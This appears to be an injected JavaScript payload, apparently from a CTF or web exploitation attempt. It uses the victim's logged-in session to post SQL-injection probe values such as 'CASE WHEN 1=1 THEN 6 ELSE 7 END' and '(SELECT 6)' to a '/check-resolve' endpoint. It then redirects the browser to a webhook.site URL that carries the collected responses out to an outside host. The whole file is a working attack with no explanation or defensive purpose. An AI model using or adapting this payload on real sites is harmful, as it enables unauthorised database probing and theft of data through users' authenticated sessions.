(async()=>{
  try{
    const hook='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';
    const vals=[
      '7-1',
      '1+5',
      '3*2',
      'CASE WHEN 1=1 THEN 6 ELSE 7 END',
      'CASE WHEN 1=0 THEN 6 ELSE 7 END',
      '(SELECT 6)'
    ];

    const out=[];

    for(const v of vals){
      const body=new URLSearchParams();
      body.append('id',v);

      const r=await fetch('/check-resolve',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body,
        credentials:'include'
      });

      out.push(v+' => '+await r.text());
    }

    location=hook+'?d='+encodeURIComponent(out.join(' || '));
  }catch(e){
    location='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err='+encodeURIComponent(e.toString());
  }
})();